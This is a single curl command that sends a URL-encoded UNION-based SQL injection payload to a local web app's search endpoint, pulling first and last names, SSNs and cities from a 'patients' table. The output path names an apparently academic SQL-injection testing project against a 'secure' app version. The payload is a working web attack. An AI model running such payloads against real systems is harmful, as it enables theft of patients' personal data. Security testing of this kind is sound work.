curl -s "http://127.0.0.1:5000/buscar?q=%27%20AND%201%3D2%20UNION%20SELECT%20FIRST,LAST,SSN,CITY%20FROM%20patients%20LIMIT%205%20--%20" \
  -o "$HOME/TCC_USP/resultados_sqli/app_seguro_union_exfil_patients.html"
